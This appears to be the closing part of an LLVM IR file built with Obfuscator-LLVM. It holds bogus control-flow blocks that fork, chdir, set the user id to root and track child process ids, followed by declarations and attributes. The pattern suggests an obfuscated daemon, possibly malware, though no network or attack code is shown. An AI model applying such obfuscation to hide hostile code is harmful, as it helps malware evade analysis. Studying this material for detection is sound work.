originalBBpart283:                                ; preds = %originalBB81
  ret i32 %621

originalBBalteredBB:                              ; preds = %originalBB, %54
  %630 = call i32 @fork() #5
  store i32 %630, i32* %8, align 4
  %631 = icmp ne i32 %630, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %73
  call void @exit(i32 0) #12
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  %632 = load i32, i32* %8, align 4
  %633 = icmp ne i32 %632, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %110
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %129
  %634 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.323, i32 0, i32 0)) #5
  %635 = call i32 @setuid(i32 0) #5
  %636 = call i32 @seteuid(i32 0) #5
  %637 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %168
  %638 = load i32, i32* %12, align 4
  %639 = sext i32 %638 to i64
  %640 = load i64, i64* @numpids, align 8
  %641 = icmp ult i64 %639, %640
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %197
  %642 = load i32, i32* %12, align 4
  %_ = shl i32 %642, 1
  %_23 = sub i32 0, %642
  %gen = add i32 %_23, 1
  %643 = add nsw i32 %642, 1
  store i32 %643, i32* %14, align 4
  br label %originalBB22

originalBB27alteredBB:                            ; preds = %originalBB27, %216
  %644 = load i32, i32* %14, align 4
  %645 = zext i32 %644 to i64
  %646 = load i64, i64* @numpids, align 8
  %647 = icmp ult i64 %645, %646
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %264
  %648 = load i32, i32* %14, align 4
  %649 = zext i32 %648 to i64
  %650 = load i64, i64* @numpids, align 8
  %651 = icmp ult i64 %649, %650
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %298
  %652 = load i32*, i32** @pids, align 8
  %653 = bitcast i32* %652 to i8*
  call void @free(i8* %653) #5
  %654 = load i32*, i32** %13, align 8
  store i32* %654, i32** @pids, align 8
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %367
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %445
  %655 = load i8*, i8** %18, align 8
  %656 = load i8, i8* %655, align 1
  %657 = zext i8 %656 to i32
  %658 = call i32 @toupper(i32 %657) #9
  %659 = trunc i32 %658 to i8
  %660 = load i8*, i8** %18, align 8
  store i8 %659, i8* %660, align 1
  %661 = load i8*, i8** %18, align 8
  %662 = getelementptr inbounds i8, i8* %661, i32 1
  store i8* %662, i8** %18, align 8
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %483
  %663 = load i8*, i8** %21, align 8
  %664 = call i64 @strlen(i8* %663) #9
  %_48 = sub i64 %664, 1
  %gen49 = mul i64 %_48, 1
  %665 = add i64 %664, 1
  %666 = call noalias i8* @malloc(i64 %665) #5
  %667 = load i32, i32* %20, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %668
  store i8* %666, i8** %669, align 8
  %670 = load i32, i32* %20, align 4
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %671
  %673 = load i8*, i8** %672, align 8
  %674 = load i8*, i8** %21, align 8
  %675 = call i64 @strlen(i8* %674) #9
  %_50 = shl i64 %675, 1
  %_51 = shl i64 %675, 1
  %_52 = sub i64 0, %675
  %gen53 = add i64 %_52, 1
  %_54 = sub i64 %675, 1
  %gen55 = mul i64 %_54, 1
  %_56 = sub i64 %675, 1
  %gen57 = mul i64 %_56, 1
  %_58 = shl i64 %675, 1
  %_59 = shl i64 %675, 1
  %676 = add i64 %675, 1
  call void @llvm.memset.p0i8.i64(i8* %673, i8 0, i64 %676, i32 1, i1 false)
  %677 = load i32, i32* %20, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %678
  %680 = load i8*, i8** %679, align 8
  %681 = load i8*, i8** %21, align 8
  %682 = call i8* @strcpy(i8* %680, i8* %681) #5
  %683 = load i32, i32* %20, align 4
  %_60 = sub i32 %683, 1
  %gen61 = mul i32 %_60, 1
  %684 = add nsw i32 %683, 1
  store i32 %684, i32* %20, align 4
  br label %originalBB47

originalBB65alteredBB:                            ; preds = %originalBB65, %534
  %685 = load i32, i32* %22, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %686
  %688 = load i8*, i8** %687, align 8
  call void @free(i8* %688) #5
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %558
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %577
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %595
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %612
  %689 = load i32, i32* %3, align 4
  br label %originalBB81
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #1

declare i32 @prctl(...) #2

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

; Function Attrs: nounwind
declare i32 @setuid(i32) #1

; Function Attrs: nounwind
declare i32 @seteuid(i32) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146429923}
!2 = !{i32 -2146428795}
!3 = !{i32 -2146428104}
!4 = !{i32 -2146427355}
!5 = !{i32 -2146426416}
